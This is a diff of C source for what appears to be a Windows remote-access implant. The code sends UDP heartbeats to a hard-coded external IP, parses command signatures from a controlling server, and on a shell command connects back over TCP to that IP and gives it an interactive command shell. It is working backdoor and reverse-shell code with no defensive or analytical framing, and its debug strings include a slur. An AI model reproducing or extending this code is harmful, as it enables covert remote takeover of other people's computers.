@@ -5,11 +5,8 @@
 #pragma comment (lib, "Mswsock.lib")
 #pragma comment (lib, "AdvApi32.lib")
 
-const char _SIG_INIT[] = {0xfb, 0x00};
-const char _SIG_FILE[] = {0xfb, 0x01};
-const char _SIG_COUT[] = {0xfb, 0x02};
-const char _SIG_SHLL[] = {0xfb, 0x03};
-const char _SIG_HRBT[] = {0xff, 0xff};
+
+
 
 SOCKET* __sock_TCP = NULL;
 SOCKET* __sock_UDP = NULL;
@@ -26,6 +23,7 @@ void HandleCTRL_C(int sg){
         TerminateProcess(__child->hProcess, 0);
     if (__heartbeat)
         TerminateThread(__heartbeat, 0);
+    WSACleanup();
     exit(0);
     #endif
 
@@ -36,79 +34,78 @@ int __cdecl main(int argc, char **argv)
     int iResult, sig;
     char buf[1024];
     SOCKET ListenSocket = INVALID_SOCKET;
-    SOCKET sock = INVALID_SOCKET;
-    SOCKET socku = INVALID_SOCKET;
-    struct sockaddr_in ad_info;
+    SOCKET sock_tcp = INVALID_SOCKET;
+    SOCKET sock_udp = INVALID_SOCKET;
+    int INIT = 0;
+    SOCKADDR_IN sa;
     PROCESS_INFORMATION pi;
-    __sock_TCP = &sock;
-    __sock_UDP = &socku;
+    __sock_TCP = &sock_tcp;
+    __sock_UDP = &sock_udp;
     __child = &pi;
     srand(time(NULL));
-    signal (SIGINT, HandleCTRL_C);
+    signal(SIGINT, HandleCTRL_C);
+    if (InitSetup() < 0){
+        return 1;
+    }
 
-    iResult = InitSetup();
-    if (iResult < 0){
+    if (SetupClientUDP(&sock_udp)< 0)
+    {
         return 1;
     }
-    iResult = HeartBeat("45.143.93.119", &__heartbeat);
-    printf("got here\n");
-    DBGLG("thread started: ", iResult);
-    iResult = SetupServerUDP(&socku);
-    if (iResult > 0){
-        perror("udpsetup failed");
+    if (GenerateSockaddrin(&sa, "45.143.93.119", DEFAULT_PORT_UDP) < 0){
         return 1;
     }
+
+    // if (SetupServerUDP(&socku_s, ad_info.sin_port) < 0){
+    //     DBGLG("Server set up failed: ", WSAGetLastError());
+    //     closesocket(sock_udp);
+    //     return 1;
+    // }
+
+    // iResult = HeartBeat("45.143.93.119", &__heartbeat);
+    // printf("Initial heartbeat sent\n");
+    // DBGLG("thread started: ", iResult);
+    if (InitServer(sock_udp, &sa) <0){
+        exit(1);
+    }
+
     /* TODO: Start a thread for heartbeating [UDPIpSetup, Connect, HeartBeat, Close]*/
     while (1){
         // MAIN EVENT LOOP
         eventloop:
-        memset(&buf, 0, 1024 * sizeof(char));
-        DBGLG("Listening\n");
-        struct sockaddr_in ccServer;
-        int ccServerSize = sizeof(ccServer);
-        iResult = recvfrom(socku, (char*)&buf, 1024, 0, (struct sockaddr *)&ccServer, &ccServerSize);
-        if (iResult < 0){
-            perror("Packet did something wonky");
-            printf("%d", WSAGetLastError());
-            exit(1);
-            goto eventloop;
-        }
-        sig = MatchSig(buf);
-        if (sig < 0){
-            perror("Invalid signature dropping connection");
-            goto eventloop;
-        }
-        switch (sig){
-            case 0x0:
-                DBGLG("Got 0\n");
+        switch ( HeartBeat(sock_udp, &sa)){
+            case _SIG_INIT:
+                DBGLG("Got INIT\n");
             /* INITIALIZE and should not be handled on client side*/
                 break;
-            case 0x1:
-                DBGLG("Got 1\n");
+            case _SIG_COUT:
+                DBGLG("Got COUT\n");
             /* File transfer, presumably uploading to client */
                 break;
-            case 0x2:
+            case _SIG_SHLL:
             /* Individual command output master -> (cmd) ->slave -> (output) -> master*/
-                DBGLG("Got 2 starting shell\n");
+                DBGLG("Got SHLL\n");
                 struct addrinfo* tcp_inf;
-                iResult = IpSetupINIT(&tcp_inf, inet_ntoa(ccServer.sin_addr));
-                iResult = Connect(&sock, tcp_inf);
+                iResult = IpSetupTCP(&tcp_inf, "45.143.93.119");
+                iResult = Connect(&sock_tcp, tcp_inf);
                 if (iResult < 0){
                     perror("failed at connecting");
                 }
-                Shell(pi, sock);
-                closesocket(sock);
+                Shell(pi, sock_tcp);
+                closesocket(sock_tcp);
+                DBGLG("Closing shell\n");
                 break;
-            case 0x3:
-                DBGLG("Got 3\n");
+            case _SIG_FILE:
+                DBGLG("Got FILE\n");
             /* Reverse shell */
                 break;
-            case 0xff:
-                DBGLG("BABY WE Got ff\n");
+            case _SIG_HRBT:
+                DBGLG("Got HRBT\n");
             /* Heartbeat */
                 break;
             default:
                 DBGLG("Got retarded data\n");
+                break;
         }
     }
 
